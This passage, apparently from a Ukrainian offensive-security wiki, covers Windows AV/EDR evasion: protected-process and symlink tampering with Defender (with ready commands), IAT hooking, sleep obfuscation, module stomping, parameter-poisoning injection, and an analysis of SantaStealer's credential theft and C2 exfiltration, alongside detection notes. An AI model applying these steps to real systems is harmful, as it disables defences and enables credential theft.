`Start=0` непридатний, оскільки BTR виконує файловий I/O з `DriverEntry`, перш ніж стек сховища та посилання `SystemRoot` будуть готові. `Start=1` разом із групою високого пріоритету `Boot Bus Extender` натомість виконується у Phase 1: NTFS уже доступна, але багато system-start security drivers і user-mode EDR services ще не ініціалізовані. Boot-start filters, такі як `WdFilter`, можуть бути вже завантажені, однак BTR може видалити їхні binary-файли або конфігурацію service перед наступним запуском, а також видалити service executable-файли до того, як SCM запустить їх. ELAM не усуває цю прогалину, оскільки BTR запускається після boot-start evaluation і має дійсний Microsoft signature.<sup>[[36]](#references)</sup>

Кілька дій виконуються в межах однієї транзакції. PoC додає на початок Action 1 для жорстко заданого `\SystemRoot\Temp\BootClean.log`: BTR створює цей log, потім обробляє власний запит на видалення та видаляє його перед вивантаженням. Це зменшує кількість evidence, а розміщення feedback у `<random>.sys:<random>.dat` дає змогу видалити driver і обидва потоки разом.<sup>[[36]](#references)[[37]](#references)</sup>

### Високосигнальні кореляції для виявлення

Правила, що ґрунтуються лише на signature, і Microsoft vulnerable-driver blocklist не протидіють зловживанню передбаченою функціональністю BTR. Надавайте перевагу цим поведінковим кореляціям, водночас відрізняючи легітимний Defender lineage від довільного launcher.<sup>[[36]](#references)</sup>

- **Sysmon 15:** створення `.sys:changelist` є універсальним для BTR staging. ADS `.dat`, приєднаний до того самого `.sys`, є особливо підозрілим, оскільки легітимний Defender зазвичай розміщує feedback у `C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\`.
- **Sysmon 12/13 без System 7045:** корелюйте безпосереднє створення `HKLM\SYSTEM\CurrentControlSet\Services\<random>`, що містить `Args=...:changelist` і `Group=Boot Bus Extender`, за відсутності відповідної SCM installation event.
- **Sysmon 6 -> 23:** корелюйте відоме завантаження BTR driver із non-Defender lineage з подальшим видаленням файлу, приписаним `System`/PID 4, особливо для security binaries.
- **Sysmon 11 -> 23:** створюйте alert для швидкого створення та видалення `\SystemRoot\Temp\BootClean.log` процесом `System`/PID 4.
- Обмежуйте та аудіюйте призначення/увімкнення `SeLoadDriverPrivilege`; одного Microsoft signature недостатньо для довіри, якщо security-tool driver розгортається через `cmd.exe`, PowerShell або невідомий процес.

## Зловживання Protected Process Light (PPL) для втручання в AV/EDR за допомогою LOLBINs

Protected Process Light (PPL) застосовує ієрархію signer/level, щоб лише protected processes з таким самим або вищим рівнем могли втручатися один в одного. В offensive-сценаріях, якщо ви можете легітимно запустити PPL-enabled binary і контролювати його arguments, ви можете перетворити benign functionality (наприклад, logging) на обмежений PPL-backed write primitive для protected directories, які використовуються AV/EDR.<sup>[[16]](#references)[[17]](#references)[[18]](#references)[[19]](#references)[[20]](#references)</sup>

Що змушує процес працювати як PPL
- Target EXE (і будь-які завантажені DLLs) має бути підписаний за допомогою PPL-capable EKU.
- Процес має бути створений через CreateProcess із такими flags: `EXTENDED_STARTUPINFO_PRESENT | CREATE_PROTECTED_PROCESS`.
- Потрібно запросити сумісний protection level, що відповідає signer binary (наприклад, `PROTECTION_LEVEL_ANTIMALWARE_LIGHT` для anti-malware signers, `PROTECTION_LEVEL_WINDOWS` для Windows signers). Неправильні levels призведуть до помилки під час створення.

Див. також ширший вступ до PP/PPL і LSASS protection тут:

{{#ref}}
stealing-credentials/credentials-protections.md
{{#endref}}

Launcher tooling
- Open-source helper: CreateProcessAsPPL (вибирає protection level і передає arguments до target EXE):
- [https://github.com/2x7EQ13/CreateProcessAsPPL](https://github.com/2x7EQ13/CreateProcessAsPPL)<sup>[[19]](#references)</sup>
- Usage pattern:
```text
CreateProcessAsPPL.exe <level 0..4> <path-to-ppl-capable-exe> [args...]
# example: spawn a Windows-signed component at PPL level 1 (Windows)
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe <args>
# example: spawn an anti-malware signed component at level 3
CreateProcessAsPPL.exe 3 <anti-malware-signed-exe> <args>
```
LOLBIN примітив: ClipUp.exe
- Підписаний системний бінарний файл `C:\Windows\System32\ClipUp.exe` запускає себе повторно та приймає параметр для запису log-файлу за шляхом, указаним caller.
- Якщо його запущено як процес PPL, запис файлу виконується з підтримкою PPL.
- ClipUp не може обробляти шляхи, що містять пробіли; використовуйте короткі шляхи 8.3, щоб указати на зазвичай захищені розташування.

Помічники для коротких шляхів 8.3
- Перелік коротких імен: `dir /x` у кожному батьківському каталозі.
- Отримання короткого шляху в cmd: `for %A in ("C:\ProgramData\Microsoft\Windows Defender\Platform") do @echo %~sA`

Ланцюжок зловживання (абстрактно)
1) Запустіть LOLBIN із підтримкою PPL (ClipUp) із прапорцем `CREATE_PROTECTED_PROCESS`, використовуючи launcher (наприклад, CreateProcessAsPPL).
2) Передайте ClipUp аргумент шляху до log-файлу, щоб примусово створити файл у захищеному каталозі AV (наприклад, Defender Platform). За потреби використовуйте короткі імена 8.3.
3) Якщо цільовий бінарний файл зазвичай відкритий або заблокований AV під час роботи (наприклад, MsMpEng.exe), заплануйте запис під час завантаження системи, до запуску AV, установивши auto-start service, який гарантовано запускається раніше. Перевірте порядок завантаження за допомогою Process Monitor (журналювання завантаження).
4) Після перезавантаження запис із підтримкою PPL відбувається до того, як AV блокує свої бінарні файли, що пошкоджує цільовий файл і запобігає запуску.

Приклад виклику (шляхи вилучено/скорочено з міркувань безпеки):
```text
# Run ClipUp as PPL at Windows signer level (1) and point its log to a protected folder using 8.3 names
CreateProcessAsPPL.exe 1 C:\Windows\System32\ClipUp.exe -ppl C:\PROGRA~3\MICROS~1\WINDOW~1\Platform\<ver>\samplew.dll
```
Примітки та обмеження
- Ви не можете контролювати вміст, який записує ClipUp, окрім його розташування; цей примітив придатний для пошкодження, а не для точного впровадження вмісту.
- Потрібні локальні права адміністратора/SYSTEM для встановлення й запуску служби, а також вікно для перезавантаження.
- Час має критичне значення: цільовий файл не повинен бути відкритим; виконання під час завантаження дає змогу уникнути блокувань файлів.

Виявлення
- Створення процесу `ClipUp.exe` з нетиповими аргументами, особливо якщо батьківським процесом є нестандартний launcher, під час або близько до завантаження системи.
- Нові служби, налаштовані на автоматичний запуск підозрілих бінарних файлів і стабільний запуск до Defender/AV. Досліджуйте створення або змінення служб перед збоями запуску Defender.
- Моніторинг цілісності файлів бінарних файлів Defender/каталогів Platform; неочікуване створення або змінення файлів процесами з ознаками protected-process.
- Телеметрія ETW/EDR: шукайте процеси, створені з `CREATE_PROTECTED_PROCESS`, і аномальне використання рівня PPL не-AV бінарними файлами.

Пом'якшення
- WDAC/Code Integrity: обмежте, які підписані бінарні файли можуть запускатися як PPL і від яких батьківських процесів; блокуйте запуск ClipUp поза легітимними контекстами.
- Гігієна служб: обмежте створення/зміну служб з автоматичним запуском і відстежуйте маніпуляції порядком запуску.
- Переконайтеся, що tamper protection Defender і захист на ранньому етапі запуску ввімкнені; досліджуйте помилки запуску, які вказують на пошкодження бінарних файлів.
- Розгляньте можливість вимкнення генерації коротких імен 8.3 на томах, де розміщені засоби безпеки, якщо це сумісно з вашим середовищем (ретельно протестуйте).

## Tampering Microsoft Defender через захоплення symlink каталогу версії Platform

Windows Defender визначає Platform, з якої він запускається, шляхом перерахування підкаталогів у:
- `C:\ProgramData\Microsoft\Windows Defender\Platform\`

Він вибирає підкаталог із найвищим лексикографічним значенням рядка версії (наприклад, `4.18.25070.5-0`), а потім запускає звідти процеси служби Defender (відповідно оновлюючи шляхи служби/реєстру). Під час цього вибору довіряє записам каталогів, зокрема directory reparse points (symlinks). Адміністратор може скористатися цим, щоб перенаправити Defender до шляху, доступного для запису attacker'у, і досягти DLL sideloading або порушення роботи служби.<sup>[[21]](#references)[[22]](#references)</sup>

Попередні умови
- Локальний Administrator (потрібен для створення каталогів/symlinks у каталозі Platform)
- Можливість перезавантажити систему або ініціювати повторний вибір Platform Defender (перезапуск служби під час завантаження)
- Потрібні лише вбудовані інструменти (`mklink`)

Чому це працює
- Defender блокує запис у власні каталоги, але під час вибору Platform довіряє записам каталогів і вибирає найвище лексикографічне значення версії, не перевіряючи, чи веде ціль до захищеного/довіреного шляху.

Покроково (приклад)
1) Підготуйте доступний для запису клон поточного каталогу Platform, наприклад `C:\TMP\AV`:
```cmd
set SRC="C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.25070.5-0"
set DST="C:\TMP\AV"
robocopy %SRC% %DST% /MIR
```
2) Створіть символічне посилання на каталог із вищою версією всередині Platform, що вказує на вашу папку:
```cmd
mklink /D "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0" "C:\TMP\AV"
```
3) Вибір тригера (рекомендується перезавантаження):
```cmd
shutdown /r /t 0
```
4) Перевірте, що MsMpEng.exe (WinDefend) запускається з перенаправленого шляху:
```powershell
Get-Process MsMpEng | Select-Object Id,Path
# or
wmic process where name='MsMpEng.exe' get ProcessId,ExecutablePath
```
Вам слід спостерігати за шляхом нового процесу в `C:\TMP\AV\` і конфігурацією служби/реєстром, що відображають це розташування.

Post-exploitation options
- DLL sideloading/code execution: Додайте або замініть DLL, які Defender завантажує з каталогу свого застосунку, щоб виконати код у процесах Defender. Див. розділ вище: [DLL Sideloading & Proxying](#dll-sideloading--proxying).
- Service kill/denial: Видаліть version-symlink, щоб під час наступного запуску налаштований шлях не розгортався, а Defender не зміг запуститися:
```cmd
rmdir "C:\ProgramData\Microsoft\Windows Defender\Platform\5.18.25070.5-0"
```
> [!TIP]
> Зверніть увагу, що ця техніка сама по собі не забезпечує підвищення привілеїв; для її використання потрібні права адміністратора.

## API/IAT Hooking + Call-Stack Spoofing with PIC (Crystal Kit-style)

Red teams можуть перенести runtime evasion із C2 implant безпосередньо до цільового модуля, перехопивши його Import Address Table (IAT) і спрямувавши вибрані API через контрольований зловмисником position-independent code (PIC). Це узагальнює evasion за межами невеликого набору API, який надають багато kit (наприклад, CreateProcessA), і поширює такий самий захист на BOFs та post-exploitation DLLs.<sup>[[3]](#references)[[4]](#references)[[5]](#references)</sup>

Підхід на високому рівні
- Розмістіть PIC blob поруч із цільовим модулем за допомогою reflective loader (як префікс або companion). PIC має бути самодостатнім і position-independent.
- Під час завантаження host DLL пройдіть її IMAGE_IMPORT_DESCRIPTOR і змініть записи IAT для цільових імпортів (наприклад, CreateProcessA/W, CreateThread, LoadLibraryA/W, VirtualAlloc), щоб вони вказували на тонкі PIC wrappers.
- Кожен PIC wrapper виконує evasion перед передачею керування через tail-call до адреси реального API. Типовий evasion включає:
- Маскування/розмаскування пам’яті навколо виклику (наприклад, шифрування beacon regions, RWX→RX, зміна назв/дозволів сторінок), а потім відновлення після виклику.
- Call-stack spoofing: створіть benign stack і виконайте перехід до цільового API, щоб аналіз call stack визначав очікувані frames.<sup>[[9]](#references)</sup>
- Для сумісності експортуйте інтерфейс, щоб Aggressor script (або еквівалент) міг реєструвати API, які потрібно перехоплювати для Beacon, BOFs і post-ex DLLs.

Чому тут використовується IAT hooking
- Працює для будь-якого коду, який використовує перехоплений import, без модифікації коду інструмента або залежності від Beacon для проксування певних API.
- Охоплює post-ex DLLs: перехоплення LoadLibrary* дає змогу перехоплювати завантаження модулів (наприклад, System.Management.Automation.dll, clr.dll) і застосовувати той самий masking/stack evasion до їхніх API-викликів.
- Відновлює надійне використання post-ex команд для створення процесів проти detections, заснованих на call stack, шляхом обгортання CreateProcessA/W.

Мінімальний ескіз IAT hook (x64 C/C++ pseudocode)
```c
// For each IMAGE_IMPORT_DESCRIPTOR
//  For each thunk in the IAT
//    if imported function == "CreateProcessA"
//       WriteProcessMemory(local): IAT[idx] = (ULONG_PTR)Pic_CreateProcessA_Wrapper;
// Wrapper performs: mask(); stack_spoof_call(real_CreateProcessA, args...); unmask();
```
Нотатки
- Застосовуйте patch після relocations/ASLR і перед першим використанням import. Reflective loaders на кшталт TitanLdr/AceLdr демонструють hooking під час DllMain завантаженого модуля.
- Робіть wrappers короткими та PIC-safe; визначайте справжній API через оригінальне значення IAT, збережене до patching, або через LdrGetProcedureAddress.
- Використовуйте переходи RW → RX для PIC і не залишайте сторінки одночасно writable+executable.

Заглушка підміни стеку викликів
- PIC stubs у стилі Draugr створюють fake call chain (return addresses у benign modules), а потім передають керування реальному API.
- Це обходить detections, які очікують canonical stacks від Beacon/BOFs до sensitive APIs.
- Поєднуйте це з техніками stack cutting/stack stitching, щоб опинитися всередині очікуваних frames перед прологом API.

Операційна інтеграція
- Додавайте reflective loader на початок post-ex DLLs, щоб PIC і hooks автоматично ініціалізувалися під час завантаження DLL.
- Використовуйте Aggressor script для реєстрації target APIs, щоб Beacon і BOFs прозоро отримували переваги того самого evasion path без змін коду.

Міркування щодо Detection/DFIR
- IAT integrity: entries, що вказують на non-image (heap/anon) addresses; періодична перевірка import pointers.
- Stack anomalies: return addresses, що не належать loaded images; різкі переходи до non-image PIC; inconsistent RtlUserThreadStart ancestry.
- Loader telemetry: in-process writes до IAT, рання активність DllMain, що змінює import thunks, неочікувані RX regions, створені під час load.
- Image-load evasion: якщо hooking LoadLibrary*, відстежуйте підозрілі loads automation/clr assemblies, пов’язані з memory masking events.

Пов’язані building blocks і приклади
- Reflective loaders, які виконують IAT patching під час load (наприклад, TitanLdr, AceLdr)
- Memory masking hooks (наприклад, simplehook) і stack-cutting PIC (stackcutting)
- PIC call-stack spoofing stubs (наприклад, Draugr)


## Import-Time IAT Hooking + Sleep Obfuscation (Crystal Palace/PICO)

### Import-time IAT hooks через resident PICO

Якщо ви контролюєте reflective loader, можна виконувати hooking imports **під час** `ProcessImports()`, замінивши pointer loader's `GetProcAddress` на custom resolver, який спочатку перевіряє hooks:<sup>[[6]](#references)[[7]](#references)[[8]](#references)</sup>

- Створіть **resident PICO** (persistent PIC object), який зберігається після того, як transient loader PIC звільняє себе.
- Експортуйте функцію `setup_hooks()`, яка перезаписує import resolver loader (наприклад, `funcs.GetProcAddress = _GetProcAddress`).
- У `_GetProcAddress` пропускайте ordinal imports і використовуйте hash-based hook lookup на кшталт `__resolve_hook(ror13hash(name))`. Якщо hook існує, повертайте його; інакше передавайте виклик справжньому `GetProcAddress`.
- Реєструйте hook targets під час link time через Crystal Palace entries `addhook "MODULE$Func" "hook"`. Hook залишається дійсним, оскільки міститься всередині resident PICO.

Це забезпечує **import-time IAT redirection** без patching code section завантаженої DLL після load.

### Примусове додавання hookable imports, коли target використовує PEB-walking

Import-time hooks спрацьовують лише тоді, коли функція фактично присутня в IAT target. Якщо module resolve APIs через PEB-walk + hash (без import entry), примусово додайте справжній import, щоб шлях `ProcessImports()` loader його побачив:

- Замініть hashed export resolution (наприклад, `GetSymbolAddress(..., HASH_FUNC_WAIT_FOR_SINGLE_OBJECT)`) на пряме посилання на кшталт `&WaitForSingleObject`.
- Compiler створить IAT entry, що дасть змогу перехопити її, коли reflective loader resolve imports.

### Sleep/idle obfuscation у стилі Ekko без patching `Sleep()`

Замість patching `Sleep` hook-айте **фактичні wait/IPC primitives**, які використовує implant (`WaitForSingleObject(Ex)`, `WaitForMultipleObjects`, `ConnectNamedPipe`). Для тривалих waits обгорніть виклик у obfuscation chain у стилі Ekko, яка encrypt-ить in-memory image під час idle:<sup>[[31]](#references)[[27]](#references)</sup>

- Використовуйте `CreateTimerQueueTimer` для планування послідовності callbacks, які викликають `NtContinue` зі crafted `CONTEXT` frames.
- Типовий chain (x64): перевести image у `PAGE_READWRITE` → виконати RC4 encryption через `advapi32!SystemFunction032` над full mapped image → виконати blocking wait → виконати RC4 decryption → **відновити per-section permissions**, пройшовши PE sections → подати signal про завершення.
- `RtlCaptureContext` надає template `CONTEXT`; клонувати його в кілька frames і встановити registers (`Rip/Rcx/Rdx/R8/R9`) для виклику кожного кроку.

Операційна деталь: повертайте “success” для тривалих waits (наприклад, `WAIT_OBJECT_0`), щоб caller продовжував роботу, поки image masked. Цей pattern приховує module від scanners під час idle windows і уникає класичної signature “patched `Sleep()`”.

Ідеї для Detection (на основі telemetry)
- Сплески callbacks `CreateTimerQueueTimer`, що вказують на `NtContinue`.
- Використання `advapi32!SystemFunction032` для великих contiguous buffers розміром із image.
- `VirtualProtect` для великих діапазонів із подальшим custom per-section permission restoration.

### Runtime CFG registration для sleep-obfuscation gadgets

На CFG-enabled targets перший indirect jump до mid-function gadget, такого як `jmp [rbx]` або `jmp rdi`, зазвичай призведе до crash процесу з `STATUS_STACK_BUFFER_OVERRUN`, оскільки gadget відсутній у CFG metadata module. Щоб підтримувати chains у стилі Ekko/Kraken у hardened processes:<sup>[[30]](#references)</sup>

- Зареєструйте кожен indirect destination, який використовує chain, через `NtSetInformationVirtualMemory(..., VmCfgCallTargetInformation, ...)` і entries `CFG_CALL_TARGET_VALID`.
- Для addresses усередині loaded images (`ntdll`, `kernel32`, `advapi32`) `MEMORY_RANGE_ENTRY` має починатися з **image base** і охоплювати **full image size**.
- Для manually mapped/PIC/stomped regions використовуйте **allocation base** і **allocation size**.
- Позначайте не лише dispatch gadget, а й exports, до яких здійснюється indirect reach (`NtContinue`, `SystemFunction032`, `VirtualProtect`, `GetThreadContext`, `SetThreadContext`, wait/event syscalls), а також будь-які attacker-controlled executable sections, які стануть indirect targets.

Це перетворює sleep chains у стилі ROP/JOP із “працює лише в non-CFG processes” на reusable primitive для `explorer.exe`, browsers, `svchost.exe` та інших endpoints, скомпільованих із `/guard:cf`.

### CET-safe stack spoofing для sleeping threads

Повна заміна `CONTEXT` є noisy і може ламатися в CET Shadow Stack systems, оскільки spoofed `Rip` все одно має узгоджуватися з hardware shadow stack. Безпечніший sleep-masking pattern:<sup>[[30]](#references)</sup>

- Виберіть інший thread у тому самому process і прочитайте його `NT_TIB` / TEB stack bounds (`StackBase`, `StackLimit`) через `NtQueryInformationThread`.
- Збережіть backup справжнього TEB/TIB поточного thread.
- Захопіть справжній sleeping context через `GetThreadContext`.
- Скопіюйте **лише** справжній `Rip` у spoof context, залишивши spoofed `Rsp`/stack state без змін.
- Під час sleep window скопіюйте spoof thread's `NT_TIB` у current TEB, щоб stack walkers розгорталися всередині legitimate stack range.
- Після завершення wait відновіть original TIB і thread context.

Це зберігає CET-consistent instruction pointer, водночас вводячи в оману EDR stack walkers, які довіряють TEB stack metadata під час перевірки unwinds.

### APC-based альтернатива: Kraken Mask

Якщо timer-queue dispatch має надто помітні signatures, ту саму послідовність sleep-encrypt-spoof-restore можна виконати із suspended helper thread через queued APCs:<sup>[[27]](#references)</sup>

- Створіть helper thread із `NtTestAlert` як entrypoint.
- Поставте в queue підготовлені `CONTEXT` frames/APCs через `NtQueueApcThread` і drain-те їх через `NtAlertResumeThread`.
- Зберігайте chain state у heap, а не в helper stack, щоб не вичерпати стандартний 64 KB thread stack.
- Використовуйте `NtSignalAndWaitForSingleObject`, щоб атомарно подати signal start event і заблокуватися.
- Призупиніть main thread перед відновленням TIB/context (`NtSuspendThread` → restore → `NtResumeThread`), щоб зменшити race window, у якому scanner міг би побачити partially restored stack.

Це замінює signature `CreateTimerQueueTimer` + `NtContinue` на helper-thread/APC signature, зберігаючи ті самі цілі RC4 masking і stack-spoofing.

Додаткові ідеї для Detection
- `NtSetInformationVirtualMemory` із `VmCfgCallTargetInformation` незадовго до sleeps, waits або APC dispatch.
- `GetThreadContext`/`SetThreadContext`, обгорнуті навколо `WaitForSingleObject(Ex)`, `NtWaitForSingleObject`, `NtSignalAndWaitForSingleObject` або `ConnectNamedPipe`.
- `NtQueryInformationThread`, після якого виконуються direct writes у stack bounds TEB/TIB current thread.
- Chains `NtQueueApcThread`/`NtAlertResumeThread`, які опосередковано досягають `SystemFunction032`, `VirtualProtect` або helpers для section-permission restoration.
- Повторне використання коротких gadget signatures, таких як `FF 23` (`jmp [rbx]`) або `FF E7` (`jmp rdi`), як dispatch pivots усередині signed modules.


## Precision Module Stomping

Module stomping виконує payload із **`.text` section DLL, уже mapped усередині target process**, замість allocation очевидної private executable memory або завантаження нової sacrificial DLL. Target для overwrite має бути **loaded, disk-backed image**, чий code space може вмістити payload без пошкодження code paths, які process усе ще потребує.<sup>[[1]](#references)[[2]](#references)</sup>

### Надійний вибір target

Naive stomping проти common modules, таких як `uxtheme.dll` або `comctl32.dll`, є fragile: DLL може бути не loaded у remote process, а надто мала code region призведе до crash process. Надійніший workflow:

1. Перелічіть modules target process і залиште **names-only include list** DLL, які вже loaded.
2. Спочатку build-ніть payload і зафіксуйте його **exact byte size**.
3. Проскануйте candidate DLLs на disk і порівняйте PE section **`.text` `Misc_VirtualSize`** із payload size. Це важливіше за file size, оскільки відображає розмір executable section **після mapping у memory**.
4. Розберіть **Export Address Table (EAT)** і виберіть exported function RVA як stomp start offset.
5. Розрахуйте **blast radius**: якщо payload перевищує межу вибраної function, він перезапише adjacent exports, розміщені після неї в memory.

Типові recon/selection helpers, які трапляються в реальних реалізаціях:
```cmd
list-process-dlls.exe -p <PID> -n -o c:\payloads\modules.txt
python find-stompable-dlls.py -d c:\Windows\System32 -i c:\payloads\modules.txt <payload_size>
python dump-exports.py -f <dll_path>
python blast-radius.py -f <dll_path> -fnc <export_name> -s <payload_size>
```
Операційні примітки
- Надавайте перевагу DLL, які **вже завантажені** у віддалений процес, щоб уникнути telemetry від `LoadLibrary`/неочікуваних завантажень образів.
- Надавайте перевагу exports, які цільовий застосунок виконує рідко, інакше звичайні code paths можуть звернутися до змінених байтів до або після створення потоку.
- Великі implants часто потребують зміни вбудовування shellcode зі string literal на **byte-array/braced initializer**, щоб повний буфер коректно представлявся у вихідному коді injector.

Ідеї для виявлення
- Віддалений запис у **image-backed executable pages** (`MEM_IMAGE`, `PAGE_EXECUTE*`) замість поширеніших private RWX/RX allocations.
- Точки входу exports, чиї байти в пам'яті більше не відповідають backing file на диску.
- Віддалені потоки або context pivots, які починають виконання всередині legitimate DLL export, перші байти якого нещодавно було змінено.
- Підозрілі послідовності `VirtualProtect(Ex)` / `WriteProcessMemory` щодо DLL `.text` pages, після яких створюється потік.

## Process Parameter Poisoning (P3)

Process Parameter Poisoning (P3) — це **process-injection / EDR-evasion** техніка, яка уникає класичного remote write path (`VirtualAllocEx` + `WriteProcessMemory`). Замість копіювання байтів у вже запущений target вона використовує той факт, що Windows **копіює вибрані startup parameters `CreateProcessW` у child process** і зберігає їх усередині `PEB->ProcessParameters` (`RTL_USER_PROCESS_PARAMETERS`).<sup>[[28]](#references)[[29]](#references)</sup>

### Poisonable carriers, які копіює `CreateProcessW`

Корисні carriers:

- `lpCommandLine` → `RTL_USER_PROCESS_PARAMETERS.CommandLine`
- `lpEnvironment` (з `CREATE_UNICODE_ENVIRONMENT`) → `RTL_USER_PROCESS_PARAMETERS.Environment`
- `STARTUPINFO.lpReserved` → `RTL_USER_PROCESS_PARAMETERS.ShellInfo`

Практичні обмеження carriers:

- `lpCommandLine` має вказувати на **writable memory** для `CreateProcessW` і обмежений **32,767 Unicode characters**, включно з null terminator.
- `lpEnvironment` має бути Unicode environment block із послідовними рядками `NAME=VALUE\0`, що завершуються додатковим `\0`.
- `lpReserved` офіційно зарезервований, тому mapping до `ShellInfo` слід розглядати як implementation detail, а не як стабільний documented contract.

Це перетворює звичайне створення процесу на **payload-transfer primitive**. Оператор створює child process із attacker-controlled startup data і дозволяє Windows виконати cross-process copy.

### Remote lookup flow без remote write APIs

Після створення child process отримайте адресу скопійованого буфера за допомогою **read-only** primitives:

1. `NtQueryInformationProcess(ProcessBasicInformation)` → отримати `PROCESS_BASIC_INFORMATION.PebBaseAddress`
2. Прочитати remote `PEB`
3. Перейти за `PEB.ProcessParameters`
4. Прочитати `RTL_USER_PROCESS_PARAMETERS`
5. Використати вибраний pointer:
- `parameters.CommandLine.Buffer`
- `parameters.Environment`
- `parameters.ShellInfo.Buffer`

Мінімальний flow:
```c
NtQueryInformationProcess(hProcess, ProcessBasicInformation, &pbi, sizeof(pbi), &retLen);
NtReadVirtualMemoryEx(hProcess, pbi.PebBaseAddress, &peb, sizeof(peb), &bytesRead, 0);
NtReadVirtualMemoryEx(hProcess, peb.ProcessParameters, &params, sizeof(params), &bytesRead, 0);
// params.CommandLine.Buffer / params.Environment / params.ShellInfo.Buffer
```
### Виконання скопійованого буфера параметрів

Скопійована область параметрів зазвичай має права `RW`, а не executable. Поширений ланцюжок P3:

1. Створити процес у звичайному режимі (не suspended)
2. Зробити вибрану сторінку параметрів executable за допомогою `NtProtectVirtualMemory` / `VirtualProtectEx`
3. Повторно використати handle головного thread, уже повернутий у `PROCESS_INFORMATION`
4. Перенаправити виконання за допомогою `NtSetContextThread` (`CONTEXT_CONTROL`, перезаписати `RIP`)

На відміну від класичних workflow із thread hijacking, це **не потребує** `SuspendThread` / `ResumeThread`; context можна змінити безпосередньо через повернутий handle головного thread.

Це дозволяє уникнути кількох API, які зазвичай відстежуються під час injection:

- `VirtualAllocEx` / `NtAllocateVirtualMemory(Ex)`
- `WriteProcessMemory` / `NtWriteVirtualMemory`
- `CreateRemoteThread` / `NtCreateThreadEx`
- часто також `SuspendThread` / `ResumeThread`

### Обмеження null-byte та staged shellcode

Усі три carriers є **string або string-like data**, тому raw payload, що містить `0x00`, обрізається під час transfer. Практичний workaround — **null-free first stage**, який відновлює constants під час runtime, а потім завантажує довільний second stage.

Простий pattern — синтез constants на основі XOR:
```asm
mov rax, XOR_A
mov r15, XOR_B
xor rax, r15 ; result = desired value, without embedding 0x00 bytes
```
Це дає змогу першому етапу створювати stack strings, API arguments, DLL paths або shellcode loader другого етапу без вбудовування null bytes у параметр, що передається.

### Stack-based API calls from the first stage

Коли першому етапу потрібно викликати API, наприклад `LoadLibraryA`, він може:

- помістити string/buffer у stack цільового процесу
- зарезервувати **32-byte x64 shadow space**
- встановити `RCX`, `RDX`, `R8`, `R9` у constants або pointers відносно `RSP`
- зберігати **16-byte alignment** `RSP` перед викликом

Після цього second stage можна скопіювати зі stack у виділену область `PAGE_READWRITE`, змінити її на `PAGE_EXECUTE_READ` за допомогою `VirtualProtect` і виконати перехід до неї, уникаючи прямого виділення RWX.

### Detection ideas

Автори згадують такі перспективні напрямки для hunting:

- `VirtualProtectEx` / `NtProtectVirtualMemory`, які роблять **process-parameter pages executable**
- зміну захисту, після якої виконуються `SetThreadContext` / `NtSetContextThread`
- віддалене читання `PEB`, а потім `RTL_USER_PROCESS_PARAMETERS`
- незвично довгі значення або значення з високою ентропією в `lpCommandLine`, `lpEnvironment` чи `STARTUPINFO.lpReserved` під час створення процесу

### Notes

- P3 — це **cross-process transfer trick**, а не повний execution primitive сам по собі: скопійованому параметру все ще потрібна зміна execute permission і метод перенаправлення виконання.
- `RtlCreateProcessReflection` / Dirty Vanity розглядалися авторами, але були відхилені, оскільки всередині вони звертаються до підозрілих primitives, таких як `NtWriteVirtualMemory` і `NtCreateThreadEx`.

## SantaStealer Tradecraft для Fileless Evasion і Credential Theft

SantaStealer (також відомий як BluelineStealer) демонструє, як сучасні info-stealers поєднують AV bypass, anti-analysis і credential access в одному workflow.<sup>[[24]](#references)</sup>

### Keyboard layout gating і sandbox delay

- Прапорець конфігурації (`anti_cis`) перераховує встановлені keyboard layouts за допомогою `GetKeyboardLayoutList`. Якщо знайдено Cyrillic layout, sample створює порожній маркер `CIS` і завершує роботу до запуску stealers, гарантуючи, що він ніколи не активується в excluded locales, водночас залишаючи hunting artifact.
```c
HKL layouts[64];
int count = GetKeyboardLayoutList(64, layouts);
for (int i = 0; i < count; i++) {
LANGID lang = PRIMARYLANGID(HIWORD((ULONG_PTR)layouts[i]));
if (lang == LANG_RUSSIAN) {
CreateFileA("CIS", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, 0, NULL);
ExitProcess(0);
}
}
Sleep(exec_delay_seconds * 1000); // config-controlled delay to outlive sandboxes
```
### Багаторівнева логіка `check_antivm`

- Variant A проходить список процесів, хешує кожне ім'я за допомогою custom rolling checksum і порівнює його з вбудованими blocklist для debugger/sandbox; повторює checksum для імені комп'ютера та перевіряє робочі каталоги, як-от `C:\analysis`.
- Variant B перевіряє властивості системи (мінімальну кількість процесів, нещодавній uptime), викликає `OpenServiceA("VBoxGuest")` для виявлення VirtualBox additions і виконує timing checks навколо sleep, щоб виявити single-stepping. Будь-який збіг перериває виконання до запуску модулів.

### Безфайловий helper + подвійне reflective loading через ChaCha20

- Основна DLL/EXE містить Chromium credential helper, який або записується на диск, або manually mapped у пам'ять; у fileless mode він самостійно розв'язує imports/relocations, тому артефакти helper не записуються.
- Цей helper зберігає DLL другого етапу, двічі зашифровану за допомогою ChaCha20 (два 32-байтові ключі + 12-байтові nonce). Після обох проходів він reflectively завантажує blob (без `LoadLibrary`) і викликає exports `ChromeElevator_Initialize/ProcessAllBrowsers/Cleanup`, похідні від [ChromElevator](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption).<sup>[[25]](#references)</sup>
- Рутини ChromElevator використовують direct-syscall reflective process hollowing для injection у запущений Chromium browser, успадковують AppBound Encryption keys і розшифровують passwords/cookies/credit cards безпосередньо з SQLite databases, попри ABE hardening.


### Модульний in-memory collection і chunked HTTP exfil

- `create_memory_based_log` перебирає глобальну таблицю function-pointer `memory_generators` і створює по одному thread для кожного enabled module (Telegram, Discord, Steam, screenshots, documents, browser extensions тощо). Кожен thread записує результати у shared buffers і повідомляє кількість файлів після ~45-секундного join window.
- Після завершення все архівується за допомогою статично скомпільованої бібліотеки `miniz` у `%TEMP%\\Log.zip`. Потім `ThreadPayload1` очікує 15 с і передає archive chunks по 10 MB через HTTP POST на `http://<C2>:6767/upload`, підробляючи browser `multipart/form-data` boundary (`----WebKitFormBoundary***`). Кожен chunk додає `User-Agent: upload`, `auth: <build_id>`, необов'язковий `w: <campaign_tag>`, а останній chunk додає `complete: true`, щоб C2 знав, що reassembly завершено.

## References

- [1] [Advanced Evasion Tradecraft: Precision Module Stomping](https://medium.com/@toneillcodes/advanced-evasion-tradecraft-precision-module-stomping-b51feb0978fe)
- [2] [toneillcodes/windows-process-injection](https://github.com/toneillcodes/windows-process-injection)
